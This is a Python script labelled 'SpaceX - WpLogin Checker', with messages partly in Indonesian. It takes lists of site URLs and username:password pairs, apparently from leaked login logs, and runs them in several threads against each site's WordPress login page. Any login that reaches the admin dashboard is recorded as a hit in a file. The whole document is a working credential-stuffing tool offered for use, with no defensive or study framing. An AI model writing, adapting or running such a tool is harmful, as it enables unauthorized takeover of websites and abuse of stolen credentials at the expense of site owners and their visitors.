import requests
import threading
import re
from urllib.parse import urlparse

TIMEOUT = 10 
THREADS = 5  
success_count = 0
error_count = 0
failed_count = 0
invalid_count = 0
lock = threading.Lock()
DOMAIN_REGEX = re.compile(r"^(?!\d+\.\d+\.\d+\.\d+)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$")

def is_valid_domain(domain):
    return bool(DOMAIN_REGEX.match(domain))

def check_wp_login(url, username, password):
    global success_count, error_count, failed_count
    
    login_url = f"{url}/wp-login.php"
    session = requests.Session()
    
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"{url}/wp-admin/",
        "testcookie": "1"
    }
    
    try:
        response = session.post(login_url, data=data, timeout=TIMEOUT)
        
        with lock:
            if "wp-admin" in response.url:
                success_count += 1
                print(f"[+] SUCCESS: {url} | {username} | {password}")
                with open("wp-success.txt", "a") as f:
                    f.write(f"{login_url}#{username}@{password}\n")
            else:
                failed_count += 1
                print(f"[-] FAILED: {url} | {username} | {password}")
    
    except requests.exceptions.RequestException:
        with lock:
            error_count += 1
            print(f"[!] ERROR: {url}")

def get_domain(full_url):
    parsed_url = urlparse(full_url)
    domain = parsed_url.netloc or parsed_url.path.split('/')[0]

    if not domain or not is_valid_domain(domain):
        return None
    
    return f"https://{domain}" 

def worker(logins, credentials):
    global invalid_count

    for line in logins:
        parts = line.strip().split(":")
        if len(parts) != 3:
            continue  # Skip invalid lines
        
        full_url, username, password = parts
        domain = get_domain(full_url)

        if not domain or not username.strip() or not password.strip():
            with lock:
                invalid_count += 1
                print(f"[⚠️] INVALID: {full_url}")
                with open("invalid-logs.txt", "a") as f:
                    f.write(f"{full_url}\n")
            continue
        
        # Process login for each credential
        for cred in credentials:
            username, password = cred.strip().split(":")
            check_wp_login(domain, username, password)

def main():
    print("───▄█▌─▄─▄─▐█▄")
    print("───██▌▀▀▄▀▀▐██")
    print("───██▌─▄▄▄─▐██")
    print("───▀██▌▐█▌▐██▀")
    print("▄██████─▀─██████▄\n")
    
    global success_count, error_count, failed_count, invalid_count
    print("SpaceX - WpLogin Checker\nFormat Check url|usn|pass\n")
    url_file_name = input("URL Logs: ").strip()
    login_file_name = input("Credentials Logs: ").strip()

    # Load URL file
    try:
        with open(url_file_name, "r") as file:
            logins = file.readlines()
    except FileNotFoundError:
        print(f"File '{url_file_name}' tidak ditemukan!")
        return
    
    # Load credentials file
    try:
        with open(login_file_name, "r") as file:
            credentials = file.readlines()
    except FileNotFoundError:
        print(f"File '{login_file_name}' tidak ditemukan!")
        return
    
    chunk_size = len(logins) // THREADS + 1
    threads = []
    
    for i in range(THREADS):
        chunk = logins[i * chunk_size:(i + 1) * chunk_size]
        thread = threading.Thread(target=worker, args=(chunk, credentials))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

    # Tampilkan statistik akhir
    print("\nSpaceX Statistik Scan")
    print(f"✅ SUCCESS: {success_count}")
    print(f"❌ FAILED: {failed_count}")
    print(f"⚠️  ERROR: {error_count}")
    print(f"🚫 INVALID: {invalid_count}")

if __name__ == "__main__":
    main()
